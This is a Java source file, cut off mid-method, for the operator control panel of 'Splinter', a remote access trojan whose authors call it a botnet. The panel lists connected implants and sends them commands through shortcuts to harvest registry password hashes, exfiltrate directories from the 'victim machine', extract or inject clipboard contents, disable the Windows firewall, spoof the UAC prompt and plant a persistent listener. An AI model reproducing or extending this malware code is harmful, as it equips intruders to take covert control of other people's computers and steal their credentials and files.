/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.GUI;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.File;
import java.util.ArrayList;
import javax.swing.ButtonGroup;
import javax.swing.DefaultComboBoxModel;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.border.BevelBorder;
import javax.swing.border.Border;
import javax.swing.border.CompoundBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

public class JPanel_MainControllerWindow extends JPanel
  implements ActionListener, ListSelectionListener, KeyListener
{
  String strMyClassName = getName();

  Thread_Terminal thdPrivateTerminal = null;
  public Frame_PrivateTerminal myPrivateFrame = null;

  JPanel jpnlSecretMsgMode_And_JScrollPane = new JPanel(new BorderLayout());
  public JLabel jlblSecretMessageMode = new JLabel("   Secret Msg --> ", 2);
  public JPanel_TextDisplayPane txtpne_broadcastMessages;
  private JScrollPane jscrlPne_BroadcastMessage;
  private JPanel jpnlConnectedClients;
  public JButton jbtnSend_Broadcast;
  public JButton jbtnClearScreen = new JButton("Clear Screen");
  public JTextField jtfCommand_Broadcast = new JTextField(20);
  public JButton jbtnSend_Private;
  public JTextField jtfCommand_Private = new JTextField(20);
  public JPanel jpnlSend = new JPanel();
  JPanel jpnlSOUTH_Send_And_OptionButtons = new JPanel(new BorderLayout());
  JPanel jpnlOptionButtons = new JPanel(new GridLayout(1, 1));

  JPanel jpnlTerminalCommand = new JPanel(new BorderLayout());
  public JLabel jlblTerminalWorkingDirectory = new JLabel("> ");
  public JTextField jtfTerminalCommand = new JTextField(12);

  JSplitPane jspltPne_ConnectedClients = null;

  boolean messageTransmittedOK = true;

  JPanel jpnlSouth_Beacon = new JPanel(new BorderLayout());

  private ArrayList<String> alMyCommandHistory = new ArrayList();
  int currentCommandHistoryIndex = 0;
  int nextAvailSlotInHistory = 0;
  static final int MAX_COMMAND_HISTORY = 10;
  static final int HISTORY_MAX_BYTES_TO_STORE = 150;
  JPanel jpnlMessage_Text_And_ActionButton = new JPanel(new BorderLayout());

  JLabel jlblConnectedClients_Text = new JLabel("Connected Clients", 0);
  public DefaultListModel dfltLstMdl_ConnectedClients = new DefaultListModel();
  public JList jlstConnectedClients = null;
  JScrollPane jscrlPne_ConnectedClients = null;

  public static String strShortcut_Title = "Shortcuts";
  public static String strShortcut_ScreenCapture = "Capture Screen";
  public static String strShortcut_ScreenScrape = "Scrape Screen";
  public static String strShortcut_HaltScreenRecord = "Halt Screen Scrape";
  public static String strShortcut_HarvestHash = "Harvest Hashes";
  public static String strShortcut_HarvestCookies = "Harvest Cookies";
  public static String strShortcut_StopProcessExecutionImmediately = "Halt Running Tasks Immediately";
  public static String strShortcut_HarvestBrowserHistory = "Harvest Browser History";
  public static String strDownloadFileFromSystem = "Download File From RHOST";
  public static String strOrbitDirectory = "Orbit Directory";
  public static String strStopOrbitDirectory = "Stop Orbit Directory";
  public static String strEnumerateSystem = "Enumerate System";
  public static String strUploadFileFromSystem = "Upload File From RHOST";
  public static String strBrowseFileSystem = "Browse RHOST File System";
  public static String strHarvestFilesByType = "Harvest Files By Type";
  public static String strHarvestFilesUnderDirectory = "Exfil Files";
  public static String strRunningProcessList = "Running Process List";
  public static String strHarvestWirelessProfile = "Harvest Wireless Profile(if applicable)";
  public static String strDisableWindowsFirewall = "Disable Windows Firewall";
  public static String strEnableWindowsFirewall = "Enable Windows Firewall";
  public static String strDisplayWindowsFirewall = "Display Windows Firewall";
  public static String strShortcut_CopyClipboard = "Extract Clipboard";
  public static String strShortcut_InjectIntoClipboard = "Inject Into Clipboard";
  public static String strShortcut_EnableClipboardExtraction = "Enable Clipboard Extractor";
  public static String strShortcut_DisableClipboardExtraction = "Disable Clipboard Extractor";
  public static String strShortcut_EnableClipboardInjection = "Enable Clipboard Injector";
  public static String strShortcut_DisableClipboardInjection = "Disable Clipboard Injector";
  public static String strDisplayDNS = "Display DNS Entries";
  public static String strSpoofWindowsUAC = "Spoof Windows UAC";
  public static String strShortcutSetWallPaper = "Set Wall Paper";
  public static String strShortcut_EstablishPersistentListener = "Establish Persistent Listener";

  JPanel jpnlShortcut = new JPanel(new BorderLayout());
  JPanel jpnlShortcut_Alignment = new JPanel();
  public JComboBox jcbShortcuts;
  String[] arrShortcuts = { strShortcut_Title, strShortcut_StopProcessExecutionImmediately, strShortcut_EstablishPersistentListener, strShortcut_ScreenCapture, strShortcut_ScreenScrape, strShortcut_HaltScreenRecord, strOrbitDirectory, strStopOrbitDirectory, strDownloadFileFromSystem, strBrowseFileSystem, strRunningProcessList, strSpoofWindowsUAC, strEnumerateSystem, strHarvestFilesUnderDirectory, strDisplayDNS, strDisplayWindowsFirewall, strEnableWindowsFirewall, strDisableWindowsFirewall, strShortcut_CopyClipboard, strShortcut_InjectIntoClipboard, strShortcut_EnableClipboardExtraction, strShortcut_EnableClipboardInjection, strShortcut_DisableClipboardExtraction, strShortcut_DisableClipboardInjection };

  String strConnectedClientsToolTip = "<html> Select the Client you wish to send a <b> PRIVATE </b> message to.<br>Hold down the [CTRL] key to select multiple Clients.<br>If no clients are selected, the message will be broadcasted to all connected Clients</html>";
  JButton jbtnPrivate;
  JButton jbtnBrowseSystem = new JButton("Browse");
  JButton jbtnDisconnectClient = new JButton("Disconnect Client");
  JPanel jpnlPrivateTerminal = new JPanel(new GridLayout(2, 1));
  JPanel jpnlPrivateChatOptions = new JPanel(new GridLayout(1, 2));
  JRadioButton jrbPrivateFrame = new JRadioButton("Private Frame", true);
  JRadioButton jrbPrivateTab = new JRadioButton("Private Tab");
  ButtonGroup btngrp = new ButtonGroup();

  JPanel jpnlScreenName = new JPanel(new BorderLayout());
  JLabel jlblMyScreenName = new JLabel("  Screen Name:           ", 4);
  JTextField jtfMyScreenName = new JTextField(14);

  JPanel jpnlOptions_ConnectedClients_South = new JPanel(new GridLayout(7, 1));
  JPanel jpnlCheckbox_and_jbtnOpen = new JPanel(new GridLayout(1, 2));
  public JCheckBox jcbAutoScroll = new JCheckBox("Auto Scroll", true);
  public JButton jbtnOpenDropBox = new JButton("Open DropBox");

  int[] selectedImplantIndecies = null;

  int loadIndex = 0;
  public static final int INDEX_THIS_IS_MAIN_BROADCAST_TERMINAL = 0;
  public static final int INDEX_THIS_IS_PRIVATE_TERMINAL_FRAME = 1;
  public static final int INDEX_THIS_IS_CHAT_BROADCAST_TERMINAL = 2;
  public static final int INDEX_THIS_IS_CHAT_PRIVATE_FRAME = 3;
  public static final int INDEX_THIS_IS_RUNNING_PROCESS_ = 4;
  public static final int INDEX_THIS_IS_BEACONING_BROADCAST_TERMINAL = 5;
  public boolean i_am_broadcast_frame = true;
  public boolean i_am_private_frame = false;
  public boolean i_am_public_chat_frame = false;

  public int myLoadingIndex = 0;

  String terminalText = "";

  public JPanel_MainControllerWindow(int loadIdx, boolean loadingPrivateFrame, Thread_Terminal privateThd)
  {
    setBackground(Color.RED);
    setLayout(new BorderLayout());
    this.thdPrivateTerminal = privateThd;

    this.myLoadingIndex = loadIdx;

    this.i_am_private_frame = loadingPrivateFrame;
    this.i_am_broadcast_frame = (!loadingPrivateFrame);

    initializeBroadcastMessages(loadingPrivateFrame);
  }

  public void initializeBroadcastMessages(boolean iAm_Loading_PrivateFrame)
  {
    try
    {
      this.txtpne_broadcastMessages = new JPanel_TextDisplayPane();

      if (this.i_am_broadcast_frame)
      {
        this.jscrlPne_BroadcastMessage = new JScrollPane(this.txtpne_broadcastMessages);
      }
      else if (this.i_am_private_frame)
      {
        try
        {
          this.jscrlPne_BroadcastMessage = new JScrollPane(this.txtpne_broadcastMessages)
          {
            public void setBorder(Border brdr)
            {
            }
          };
          this.jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(31);
          this.jscrlPne_BroadcastMessage.setVerticalScrollBarPolicy(20);
        } catch (Exception e) {
          this.jscrlPne_BroadcastMessage = new JScrollPane(this.txtpne_broadcastMessages);
        }

      }

      this.jpnlSecretMsgMode_And_JScrollPane.add("North", this.jlblSecretMessageMode);
      this.jpnlSecretMsgMode_And_JScrollPane.add("Center", this.jscrlPne_BroadcastMessage);

      this.jpnlMessage_Text_And_ActionButton.add("Center", this.jpnlSecretMsgMode_And_JScrollPane);
      this.jpnlMessage_Text_And_ActionButton.setBounds(10, 11, 745, 414);

      this.jpnlSend.setLayout(new BorderLayout());
      this.jbtnSend_Broadcast = new JButton("Broadcast");
      this.jbtnSend_Private = new JButton("Send Command");

      this.jcbShortcuts = new JComboBox();
      this.jcbShortcuts.setModel(new DefaultComboBoxModel(this.arrShortcuts));

      if (iAm_Loading_PrivateFrame)
      {
        try
        {
          this.jtfTerminalCommand = new JTextField(12)
          {
            public void setBorder(Border brdr)
            {
            }
          };
        }
        catch (Exception e) {
          this.jtfTerminalCommand = new JTextField(12);
        }
        this.jpnlTerminalCommand.add("West", this.jlblTerminalWorkingDirectory);
        this.jpnlTerminalCommand.add("Center", this.jtfTerminalCommand);

        this.jpnlSOUTH_Send_And_OptionButtons.add("North", this.jpnlTerminalCommand);

        this.jlblTerminalWorkingDirectory.setText(this.thdPrivateTerminal.myCurrentWorkingDirectory);
      }
      else
      {
        this.jpnlSend.add("Center", this.jtfCommand_Broadcast);
        this.jpnlSend.add("East", this.jbtnSend_Broadcast);
      }

      this.jpnlSend.setBorder(new BevelBorder(0, null, null, null, null));

      if (this.i_am_private_frame)
      {
        this.jpnlOptionButtons.add(this.jbtnClearScreen);
      }

      this.jpnlMessage_Text_And_ActionButton.add("South", this.jpnlSOUTH_Send_And_OptionButtons);

      add("Center", this.jpnlMessage_Text_And_ActionButton);

      if (this.i_am_broadcast_frame)
      {
        this.jscrlPne_BroadcastMessage.setBorder(new CompoundBorder(new BevelBorder(0, null, null, null, null), new BevelBorder(1, null, null, null, null)));

        this.jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(30);
        this.jscrlPne_BroadcastMessage.setVerticalScrollBarPolicy(20);
      }

      this.jpnlConnectedClients = new JPanel();

      this.jpnlConnectedClients.setLayout(new BorderLayout());
      this.jpnlConnectedClients.setBorder(new CompoundBorder(new BevelBorder(0, null, null, null, null), new BevelBorder(1, null, null, null, null)));

      this.jscrlPne_ConnectedClients = new JScrollPane(this.jlstConnectedClients);

      this.jlstConnectedClients = new JList(this.dfltLstMdl_ConnectedClients);
      this.jscrlPne_ConnectedClients.setViewportView(this.jlstConnectedClients);

      this.jlstConnectedClients.setSelectionMode(0);
      this.jlstConnectedClients.validate();

      this.jpnlConnectedClients.add("North", this.jlblConnectedClients_Text);

      this.jpnlConnectedClients.add("Center", this.jscrlPne_ConnectedClients);
      this.jpnlConnectedClients.add("South", this.jpnlOptions_ConnectedClients_South);

      this.jbtnPrivate = new JButton("Private Terminal");
      this.jbtnBrowseSystem = new JButton("Browse Remote File System");

      if (this.i_am_broadcast_frame)
      {
        this.jpnlSOUTH_Send_And_OptionButtons.setLayout(new BorderLayout());
        this.jpnlSOUTH_Send_And_OptionButtons.add("Center", this.jpnlSend);

        this.btngrp.add(this.jrbPrivateFrame); this.btngrp.add(this.jrbPrivateTab);
        this.jpnlPrivateChatOptions.add(this.jrbPrivateFrame);
        this.jpnlPrivateChatOptions.add(this.jrbPrivateTab);

        this.jpnlOptions_ConnectedClients_South.add(this.jcbShortcuts);
        this.jpnlOptions_ConnectedClients_South.add(this.jbtnPrivate);
        this.jpnlOptions_ConnectedClients_South.add(this.jbtnBrowseSystem);
        this.jpnlOptions_ConnectedClients_South.add(this.jbtnDisconnectClient);
        this.jpnlOptions_ConnectedClients_South.add(this.jbtnClearScreen);
        this.jpnlOptions_ConnectedClients_South.add(this.jpnlPrivateChatOptions);

        this.jpnlCheckbox_and_jbtnOpen.add(this.jcbAutoScroll);
        this.jpnlCheckbox_and_jbtnOpen.add(this.jbtnOpenDropBox);
        this.jpnlOptions_ConnectedClients_South.add(this.jpnlCheckbox_and_jbtnOpen);

        this.jbtnBrowseSystem.setBackground(Color.CYAN.darker().darker());
      }
      else
      {
        this.jpnlPrivateTerminal.add(this.jbtnPrivate);
        this.jpnlPrivateTerminal.add(this.jbtnDisconnectClient);
      }

      this.jbtnPrivate.setBackground(Color.green.darker());

      this.jbtnDisconnectClient.setBackground(Color.red);

      this.jbtnDisconnectClient.addActionListener(this);

      if (!iAm_Loading_PrivateFrame)
      {
        this.jspltPne_ConnectedClients = new JSplitPane(1, this.jpnlMessage_Text_And_ActionButton, this.jpnlConnectedClients);
        this.jspltPne_ConnectedClients.setOneTouchExpandable(true);
        this.jspltPne_ConnectedClients.setDividerLocation(990);
        add("Center", this.jspltPne_ConnectedClients);
      }

      if (this.myLoadingIndex == 5)
      {
        this.jpnlConnectedClients.setVisible(false);
        this.jpnlSend.setVisible(false);

        this.jpnlSouth_Beacon.add("Center", this.jbtnClearScreen);
        this.jpnlSouth_Beacon.add("East", this.jcbAutoScroll);
        add("South", this.jpnlSouth_Beacon);
      }

      this.jlblConnectedClients_Text.setToolTipText(this.strConnectedClientsToolTip);
      this.jlstConnectedClients.setToolTipText(this.strConnectedClientsToolTip);

      this.jlblConnectedClients_Text.setBorder(new BevelBorder(0, null, null, null, null));

      this.jrbPrivateTab.setEnabled(false);

      this.jbtnSend_Broadcast.addActionListener(this);
      this.jbtnPrivate.addActionListener(this);
      this.jbtnBrowseSystem.addActionListener(this);
      this.jbtnSend_Private.addActionListener(this);
      this.jtfCommand_Broadcast.addActionListener(this);
      this.jtfCommand_Private.addActionListener(this);
      this.jbtnClearScreen.addActionListener(this);
      this.jcbShortcuts.addActionListener(this);
      this.jcbAutoScroll.addActionListener(this);
      this.jbtnOpenDropBox.addActionListener(this);
      this.jtfTerminalCommand.addActionListener(this);
      this.jlblSecretMessageMode.setOpaque(true);
      this.jlblSecretMessageMode.setFont(new Font("Courier", 1, 12));
      this.jlblSecretMessageMode.setVisible(false);
      this.jlblSecretMessageMode.setForeground(Color.white);
      this.jlblSecretMessageMode.setBackground(Color.red);
      this.jlstConnectedClients.addListSelectionListener(this);

      this.jtfCommand_Private.addKeyListener(this);
      this.jtfCommand_Broadcast.addKeyListener(this);
      this.jtfTerminalCommand.addKeyListener(this);

      this.jpnlSend.setBackground(Color.yellow);
      this.jpnlTerminalCommand.setOpaque(true);
      this.jlblTerminalWorkingDirectory.setOpaque(true);
      this.jtfTerminalCommand.setOpaque(true);

      this.jpnlTerminalCommand.setBackground(Drivers.clrBackground);
      this.jlblTerminalWorkingDirectory.setBackground(Drivers.clrBackground);
      this.jtfTerminalCommand.setBackground(Drivers.clrBackground);
      this.jtfTerminalCommand.setCaretColor(Drivers.clrImplant);
      this.jlblTerminalWorkingDirectory.setForeground(Drivers.clrImplant);
      this.jtfTerminalCommand.setForeground(Drivers.clrImplant);
    }
    catch (Exception e)
    {
      Drivers.eop("initializeBroadcastMessages", this.strMyClassName, e, "", true);
    }
  }

  public void valueChanged(ListSelectionEvent lse)
  {
    try
    {
      if (lse.getSource() == this.jlstConnectedClients)
      {
        int selectionIndex = this.jlstConnectedClients.getSelectedIndex();

        if (selectionIndex > -1)
        {
          setPrivateMessage(((Thread_Terminal)Drivers.alTerminals.get(selectionIndex)).getJListData(), true);
        }
        else
        {
          setPrivateMessage("", false);
        }
      }

    }
    catch (Exception e)
    {
      Drivers.eop("valueChanged", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean setPrivateMessage(String recipients, boolean showPrivateMessageNotification)
  {
    try
    {
      this.jlblSecretMessageMode.setText("   Secret Message --> " + recipients);
      this.jlblSecretMessageMode.setVisible(showPrivateMessageNotification);
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("setPrivateMessage", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.jbtnSend_Broadcast)
      {
        broadcastCommand();
      }
      else if (ae.getSource() == this.jbtnPrivate)
      {
        establishPrivateTerminal();
      }
      else if (ae.getSource() == this.jbtnBrowseSystem)
      {
        this.jtfCommand_Broadcast.setText("INITIATE_FILE_BROWSER");
        broadcastCommand();
      }
      else if (ae.getSource() == this.jbtnSend_Private)
      {
        sendPrivateMessage(this.thdPrivateTerminal);
      }
      else if (ae.getSource() == this.jtfCommand_Broadcast)
      {
        broadcastCommand();
      }
      else if (ae.getSource() == this.jtfCommand_Private)
      {
        sendPrivateMessage(this.thdPrivateTerminal);
      }
      else if (ae.getSource() == this.jtfTerminalCommand)
      {
        sendPrivateMessage(this.thdPrivateTerminal);
      }
      else if (ae.getSource() == this.jbtnClearScreen)
      {
        if (Drivers.jop_Confirm("Clear All Text From Screen?", "Clear Screen") == 0)
        {
          this.txtpne_broadcastMessages.clearTextPane();
        }

      }
      else if (ae.getSource() == this.jcbShortcuts)
      {
        insertShortcutCommand();
      }
      else if (ae.getSource() == this.jcbAutoScroll)
      {
        this.txtpne_broadcastMessages.autoScroll = this.jcbAutoScroll.isSelected();
      }
      else if (ae.getSource() == this.jbtnDisconnectClient)
      {
        Splinter_GUI.disconnectSelectedAgent(this.jlstConnectedClients.getSelectedIndex());
      }
      else if (ae.getSource() == this.jbtnOpenDropBox)
      {
        openDropBox();
      }

    }
    catch (Exception e)
    {
      Drivers.eop(this.strMyClassName + " ae ", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public void clearText()
  {
    try
    {
      this.txtpne_broadcastMessages.clearTextPane();
    }
    catch (Exception localException) {
    }
  }

  public boolean openDropBox() {
    try {
      if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        Splinter_GUI.setFTP_DropBoxDirectory();
      }

      if ((Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()))
      {
        Drivers.jop_Error("Drop Box not set!!!                          ", "Unable to complete selected action...");
        return false;
      }

      Process process = Runtime.getRuntime().exec("explorer.exe " + Driver.fleFTP_DropBoxDirectory.getCanonicalPath());
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("openDropBox", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean insertShortcutCommand()
  {
    try
    {
      String shortcut = (String)this.jcbShortcuts.getSelectedItem();

      if ((shortcut == null) || (shortcut.trim().equals("")))
      {
        Drivers.sop("No shortcut commands selected by user");
        return false;
      }

      shortcut = shortcut.trim();

      if (shortcut.equals(strShortcut_ScreenCapture))
      {
        this.jtfCommand_Broadcast.setText("capture screen");
        broadcastCommand();
      }

      if (shortcut.equals(strShortcut_ScreenScrape))
      {
        this.jtfCommand_Broadcast.setText("SCRAPE SCREEN");
        broadcastCommand();
      }

      if (shortcut.equals(strShortcut_HaltScreenRecord))
      {
        this.jtfCommand_Broadcast.setText("DISABLE RECORD SCREEN");
        broadcastCommand();
      }

      if (shortcut.equals(strEnumerateSystem))
      {
        this.jtfCommand_Broadcast.setText("ENUMERATE");
        broadcastCommand();
      }

      if (shortcut.equals(strHarvestWirelessProfile))
      {
        this.jtfCommand_Broadcast.setText("HARVEST_WIRELESS_PROFILE");
        broadcastCommand();
      }

      if (shortcut.equals(strShortcut_HarvestCookies))
      {
        Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
        return true;
      }

      if (shortcut.equals(strShortcut_HarvestBrowserHistory))
      {
        Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
        return true;
      }

      if (shortcut.equals(strOrbitDirectory))
      {
        this.jtfCommand_Broadcast.setText("ORBIT_DIRECTORY, c:\\users\\pwnie\\Desktop, *.*, true, 60");
        return true;
      }

      if (shortcut.equals(strStopOrbitDirectory))
      {
        this.jtfCommand_Broadcast.setText("STOP_ORBIT_DIRECTORY");
        broadcastCommand();
      }

      if (shortcut.equals(strHarvestFilesUnderDirectory))
      {
        this.jtfCommand_Broadcast.setText("EXFIL_DIRECTORY, c:\\users\\pwnie\\Desktop, *.*, false");
        return true;
      }

      if (shortcut.equals(strDisableWindowsFirewall))
      {
        this.jtfCommand_Broadcast.setText("DISABLE_WINDOWS_FIREWALL");
        broadcastCommand();
      }

      if (shortcut.equals(strEnableWindowsFirewall))
      {
        this.jtfCommand_Broadcast.setText("ENABLE_WINDOWS_FIREWALL");
        broadcastCommand();
      }

      if (shortcut.equals(strDisplayWindowsFirewall))
      {
        this.jtfCommand_Broadcast.setText("DISPLAY_WINDOWS_FIREWALL");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_HarvestHash))
      {
        this.jtfCommand_Broadcast.setText("HARVEST_REGISTRY_HASHES");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_EstablishPersistentListener))
      {
        int portToListenHard = 80;
        try
        {
          portToListenHard = Integer.parseInt(Drivers.jop_Query("Please specify port to establish listener on implant machine", "Enter Listener Port"));

          if ((portToListenHard < 1) || (portToListenHard > 65534))
          {
            throw new Exception("port out of range");
          }

        }
        catch (Exception e)
        {
          Drivers.jop_Error("Invalid port entered or port is out of range", "Unable to set port");
          return false;
        }

        if (this.i_am_broadcast_frame)
        {
          this.jtfCommand_Broadcast.setText("<@SHORTCUT>/3/" + portToListenHard + "/" + "Splinter_RAT.jar");
        }
        else if (this.i_am_private_frame)
        {
          this.jtfCommand_Private.setText("<@SHORTCUT>/3/" + portToListenHard + "/" + "Splinter_RAT.jar");
        }

      }
      else if (shortcut.equals(strDownloadFileFromSystem))
      {
        this.jtfCommand_Broadcast.setText("download \"[absolute path to file on victim machine (including quotes)]\"");
      }
      else if (shortcut.equals(strUploadFileFromSystem))
      {
        Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
      }
      else if (shortcut.equals(strShortcut_CopyClipboard))
      {
        this.jtfCommand_Broadcast.setText("EXTRACT_CLIPBOARD");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_InjectIntoClipboard))
      {
        this.jtfCommand_Broadcast.setText("INJECT_CLIPBOARD");
        broadcastCommand();
      }
      else if (shortcut.equals(strSpoofWindowsUAC))
      {
        this.jtfCommand_Broadcast.setText("SPOOF_UAC, [Spoof Program Title], [Executable Name]");
      }
      else if (shortcut.equals(strShortcutSetWallPaper))
      {
        Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
      }
      else if (shortcut.equals(strBrowseFileSystem))
      {
        this.jtfCommand_Broadcast.setText("INITIATE_FILE_BROWSER");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_StopProcessExecutionImmediately))
      {
        this.jtfCommand_Broadcast.setText("STOP_PROCESS");
        broadcastCommand();
      }
      else if (shortcut.equals(strHarvestFilesByType))
      {
        Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
      }
      else if (shortcut.equals(strRunningProcessList))
      {
        this.jtfCommand_Broadcast.setText("RUNNING_PS");
        broadcastCommand();
      }
      else if (shortcut.equals(strDisplayDNS))
      {
        this.jtfCommand_Broadcast.setText("ipconfig /displaydns");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_EnableClipboardExtraction))
      {
        this.jtfCommand_Broadcast.setText("ENABLE CLIPBOARD EXTRACTOR");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_EnableClipboardInjection))
      {
        this.jtfCommand_Broadcast.setText("ENABLE CLIPBOARD INJECTOR");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_DisableClipboardExtraction))
      {
        this.jtfCommand_Broadcast.setText("DISABLE CLIPBOARD EXTRACTOR");
        broadcastCommand();
      }
      else if (shortcut.equals(strShortcut_DisableClipboardInjection))
      {
        this.jtfCommand_Broadcast.setText("DISABLE CLIPBOARD INJECTOR");
        broadcastCommand();
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("insertShortcutCommand", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean sendPrivateMessage(Thread_Terminal terminal)
  {
    try
    {
      if (terminal == null)
      {
        return false;
      }

      try
      {
        this.terminalText = this.jtfTerminalCommand.getText();
        if ((this.terminalText != null) && ((this.terminalText.trim().equalsIgnoreCase("clear")) || (this.terminalText.trim().equalsIgnoreCase("clr")) || (this.terminalText.trim().equalsIgnoreCase("cls"))))
        {
          this.txtpne_broadcastMessages.clearTextPane();
          this.jtfTerminalCommand.setText("");
          return true;
        }

        if ((this.i_am_private_frame) && (this.terminalText != null) && (this.terminalText.trim().equalsIgnoreCase("exit")) && (this.myPrivateFrame != null))
          try
          {
            this.myPrivateFrame.closeFrame(); return true;
          }
          catch (Exception localException1)
          {
          }
        if ((terminal.alJtxtpne_PrivatePanes != null) && (terminal.alJtxtpne_PrivatePanes.size() > 0))
        {
          for (int i = 0; i < terminal.alJtxtpne_PrivatePanes.size(); i++)
          {
            ((JPanel_TextDisplayPane)terminal.alJtxtpne_PrivatePanes.get(i)).appendString(true, "ME", this.terminalText, Drivers.clrController, Drivers.clrBackground);
          }

        }
        else
        {
          Drivers.txtpne_broadcastMessageBoard.appendString(true, "ME", this.terminalText, Drivers.clrController, Drivers.clrBackground);
        }

      }
      catch (Exception e)
      {
        this.txtpne_broadcastMessages.appendString(true, "ME", this.terminalText, Drivers.clrController, Drivers.clrBackground);
      }

      saveCommandHistory(this.terminalText);

      terminal.sendCommand_RAW(this.terminalText);

      this.jtfTerminalCommand.setText("");

      return true;
    }
    catch (NullPointerException e)
    {
      Drivers.sop("Null Pointer Exception caught when attempting to send a private chat message");
    }
    catch (Exception e)
    {
      Drivers.eop("sendPrivateMessage", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean establishPrivateTerminal()
  {
    try
    {
      if (Drivers.alTerminals.size() < 1)
      {
        Drivers.jop_Error("No implants are connected", "Cannot Establish Private Terminal");
        return false;
      }

      if (this.jlstConnectedClients.getSelectionMode() == 0)
      {
        int index = this.jlstConnectedClients.getSelectedIndex();

        if (index < 0)
        {
          Drivers.jop_Error("Please select an implant to continue.", "Cannot Establish Private Terminal");
          return false;
        }

        if (this.jrbPrivateFrame.isSelected())
        {
          Frame_PrivateTerminal privateFrame = new Frame_PrivateTerminal(1, (Thread_Terminal)Drivers.alTerminals.get(index));
          privateFrame.setVisible(true);
        }
        else if (this.jrbPrivateTab.isSelected())
        {
          Drivers.jop_Message("Solo, need to continue in " + this.strMyClassName + " to add logic for creating private tabs");
        }

      }
      else
      {
        this.selectedImplantIndecies = this.jlstConnectedClients.getSelectedIndices();

        if ((this.selectedImplantIndecies == null) || (this.selectedImplantIndecies.length < 1))
        {
          Drivers.jop_Error("No implants are selected", "Cannot Establish Private Terminal");
          return false;
        }

        for (int i = 0; i < this.selectedImplantIndecies.length; i++)
        {
          if (this.jrbPrivateFrame.isSelected())
          {
            Frame_PrivateTerminal privateFrame = new Frame_PrivateTerminal(1, (Thread_Terminal)Drivers.alTerminals.get(i));
            privateFrame.setVisible(true);
          }
          else if (this.jrbPrivateTab.isSelected())
          {
            Drivers.jop_Message("Solo, need to continue in " + this.strMyClassName + " to add logic for creating private tabs");
          }

        }

      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("establishPrivateTerminal", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean broadcastCommand()
  {
    try
    {
      this.terminalText = this.jtfCommand_Broadcast.getText();
      if ((this.terminalText != null) && ((this.terminalText.trim().equalsIgnoreCase("clear")) || (this.terminalText.trim().equalsIgnoreCase("clr")) || (this.terminalText.trim().equalsIgnoreCase("cls"))))
      {
        this.txtpne_broadcastMessages.clearTextPane();
        this.jtfCommand_Broadcast.setText("");
        return true;
      }

      if (Drivers.alTerminals.size() < 1)
      {
        Drivers.jop_Error("No implants are connected", "Can't Send Command");
        return false;
      }

      this.selectedImplantIndecies = this.jlstConnectedClients.getSelectedIndices();

      this.messageTransmittedOK = true;

